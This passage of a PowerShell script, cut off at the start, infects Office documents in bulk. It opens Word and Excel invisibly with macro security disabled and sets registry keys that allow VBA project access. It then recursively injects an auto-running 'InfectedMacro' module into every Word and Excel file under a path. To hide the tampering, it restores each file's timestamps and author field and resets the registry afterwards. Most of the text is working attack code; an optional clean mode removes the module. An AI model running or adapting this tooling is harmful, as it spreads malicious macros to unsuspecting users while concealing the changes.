    $PPTCode = $Code.Replace("Auto_Open","AutoOpen")
    $WordCode = $Code.Replace("Auto_Open","AutoOpen")
    $ExcelCode = $Code.Replace("AutoOpen","Auto_Open")

    $Global:Counter = 0
    $Word = NEW-Object -comobject Word.Application
    $Word.Visible = $False
    $Word.AutomationSecurity = "msoAutomationSecurityForceDisable"
    $WordVersion = $Word.Version
    $Word.DisplayAlerts = 'wdAlertsNone'
    $Word.ScreenUpdating = $False
    $Excel = New-Object -ComObject Excel.Application
    $Excel.Visible = $False
    $Excel.AutomationSecurity = "msoAutomationSecurityForceDisable"
    $ExcelVersion = $Excel.Version
    $Excel.DisplayAlerts = 'wdAlertsNone'
    $Excel.DisplayAlerts = $False
    $Excel.ScreenUpdating = $False
    $Excel.UserControl = $False
    $Excel.Interactive = $False
    #$PPT = New-Object -ComObject Powerpoint.Application
    #$PowerPointVersion = $PPT.Version
    #$PPT.DisplayAlerts = [Microsoft.Office.Interop.PowerPoint.PpAlertLevel]::ppAlertsNone
    #$PPT.AutomationSecurity = "msoAutomationSecurityForceDisable"


    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force| Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force| Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force| Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force| Out-Null
    #New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PowerPointVersion\PowerPoint\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force| Out-Null
    #New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PowerPointVersion\PowerPoint\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force| Out-Null

    $InfectionPath = (Resolve-Path $InfectionPath).Path

    if($Clean){
        Write-Output "Cleaning Documents..."
    } else {
        Write-Output "Infecting Documents..."
    }
    Get-ChildItem -Path $InfectionPath -Include *.doc, *.docm, *.dot, *.dotm, *.xls, *.xlt, *.xlsm, *.xltm -Recurse | ForEach-Object {
        $WriteTimeBefore = $_.LastWriteTime
        $AccessTimeBefore = $_.LastAccessTime
        if ($_.Extension.ToString() -like ".xl*") {
            ExcelInfect -File $_ -Clean $Clean
        }
    
        if ($_.Extension.ToString() -like ".do*") {
            WordInfect -File $_ -Clean $Clean
        }
        #if ($_.Extension.ToString() -like ".ppt*" -or $_.Extension.ToString() -like ".pot*") {
        #    PowerPointInfect -File $_
        #}
        $_.LastWriteTime = $WriteTimeBefore
        $_.LastAccessTime = $AccessTimeBefore
    }
    
    $Word.Application.Quit()
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word) | Out-Null
    $Word = $null
    if (PS winword) {
        kill -name winword
    }
    $Excel.Application.Quit()
    [System.Runtime.InteropServices.Marshal]::ReleaseComObject($Excel) | Out-Null
    $Excel = $null
    if (PS excel) {
        kill -name excel
    }
    #$PPT.Quit()
    #[System.Runtime.InteropServices.Marshal]::ReleaseComObject($PPT) | Out-Null
    #$PPT = $null
    #if (PS powerpnt) {
        #kill -name powerpnt
    #}


    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force| Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force| Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force| Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force| Out-Null
    #New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PowerPointVersion\PowerPoint\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force| Out-Null
    #New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PowerPointVersion\PowerPoint\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force| Out-Null
    Write-Output "Finished"
    if($Clean){
        Write-Output "Cleaned $($Global:Counter) Documents"
    } else {
        Write-Output "Infected $($Global:Counter) Documents"
        
    }
}

function ExcelInfect([System.IO.FileSystemInfo] $File, [Boolean] $Clean){
    #Add-Type -AssemblyName Microsoft.Office.Interop.Excel
    $Book = $Excel.Workbooks.Open($File.FullName)
    $Author = $Book.Author
    $Skip = $False
    ForEach ($Mod in $Book.VBProject.VBComponents) {
        if ($Mod.Name.Equals("InfectedMacro")){
            if($Clean){
                $Book.VBProject.VBComponents.Remove($Mod)
                $Skip = $True
            } else {
                Write-Output "$($File.Name) is already infected"
                $Book.Close()
		return
            }
        }
    }
    if(!$Skip){
        $Module = $Book.VBProject.VBComponents.Add(1)
        $Module.Name = "InfectedMacro"
        $Module.CodeModule.AddFromString($ExcelCode)
    }
    $Book.Author = $Author
    switch ($File.Extension.toString())
    {
        ".xls"{
            "File is '.xls' " + $File.Name
            $Book.SaveAs($File.FullName, [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
            $Global:Counter++
        }
        ".xlsm"{
            "File is '.xlsm' " + $File.Name
            $Book.SaveAs($File.FullName, [Microsoft.Office.Interop.Excel.XlFileFormat]::xlOpenXMLWorkbookMacroEnabled)
            $Global:Counter++
        }
        ".xlt"{
            "File is '.xlt' " + $File.Name
            $Book.SaveAs($File.FullName, [Microsoft.Office.Interop.Excel.XlFileFormat]::xlTemplate8)
            $Global:Counter++
        }
        ".xltm"{
            "File is '.xltm' " + $File.Name
            $Book.SaveAs($File.FullName, [Microsoft.Office.Interop.Excel.XlFileFormat]::xlOpenXMLTemplateMacroEnabled)
            $Global:Counter++
        }
        default {}
    }
    $Book.Close()
}

function WordInfect([System.IO.FileSystemInfo] $File, [Boolean] $Clean){
    #Add-Type -AssemblyName Microsoft.Office.Interop.Word
    $Doc = $Word.Documents.Open($File.FullName)
    $Skip = $False
    ForEach ($Mod in $Doc.VBProject.VBComponents) {
        if ($Mod.Name.Equals("InfectedMacro")){
            if($Clean){
                $Doc.VBProject.VBComponents.Remove($Mod)
                $Skip = $True
            } else {
                Write-Output "$($File.Name) is already infected"
                $Doc.Close()
		return
            }
        }
    }
    if(!$Skip){
        $Module = $Doc.VBProject.VBComponents.Add(1)
        $Module.Name = "InfectedMacro"
        $Module.CodeModule.AddFromString($WordCode)
    }
  
    switch ($File.Extension.ToString()) {
        ".doc"{
            "File is '.doc' " + $File.Name
            $Doc.SaveAs($File.FullName, [Microsoft.Office.Interop.Word.WdSaveFormat]::wdFormatDocument97)
            $Global:Counter++
        }
        ".docm"{
            "File is '.docm' " + $File.Name
            $Doc.SaveAs($File.FullName, [Microsoft.Office.Interop.Word.WdSaveFormat]::wdFormatXMLDocumentMacroEnabled)
            $Global:Counter++
        }
        ".dot"{
            "File is '.dot' " + $File.Name
            $Doc.SaveAs($File.FullName, [Microsoft.Office.Interop.Word.WdSaveFormat]::wdFormatTemplate97)
            $Global:Counter++
        }
        ".dotm"{
            "File is '.dotm' " + $File.Name
            $Doc.SaveAs($File.FullName, [Microsoft.Office.Interop.Word.WdSaveFormat]::wdFormatXMLTemplateMacroEnabled)
            $Global:Counter++
        }
        default {}
    }
    $Doc.Close()
}
function PowerPointInfect([System.IO.FileSystemInfo] $File, [Boolean] $Clean){
    #Add-Type -AssemblyName Microsoft.Office.Interop.PowerPoint
    $Pres = $PPT.Presentations.Open($File.FullName, [Microsoft.Office.Core.MsoTriState]::msoFalse, [Microsoft.Office.Core.MsoTriState]::msoFalse, [Microsoft.Office.Core.MsoTriState]::msoFalse)
    if($Clean){
        ForEach ($Module in $Pres.VBProject.VBComponents) {
            if ($Module.Name -eq "InfectedMacro"){
                $Pres.VBProject.VBComponents.Remove($Module)
            }
        }
    } else {
        $Module = $Pres.VBProject.VBComponents.Add(1)
        $Module.Name = "InfectedMacro"
        $Module.CodeModule.AddFromString($PPTCode)
    }
        
    switch ($File.Extension.ToString()) {
        ".ppt"{
            "File is '.ppt' " + $File.Name
            $Pres.SaveAs($File.FullName, [Microsoft.Office.Interop.PowerPoint.PpSaveAsFileType]::ppSaveAsPresentation)
            $Global:Counter++
        }
        ".pptm"{
            "File is '.pptm' " + $File.Name
            $Pres.SaveAs($File.FullName, [Microsoft.Office.Interop.PowerPoint.PpSaveAsFileType]::ppSaveAsOpenXMLPresentationMacroEnabled)
            $Global:Counter++
        }
        ".pot"{
            "File is '.pot' " + $File.Name
            $Pres.SaveAs($File.FullName, [Microsoft.Office.Interop.PowerPoint.PpSaveAsFileType]::ppSaveAsTemplate)
            $Global:Counter++
        }
        ".potm"{
            "File is '.potm' " + $File.Name
            $Pres.SaveAs($File.FullName, [Microsoft.Office.Interop.PowerPoint.PpSaveAsFileType]::ppSaveAsOpenXMLTemplateMacroEnabled)
            $Global:Counter++
        }
        default {}
    }
    $Pres.Close()
}
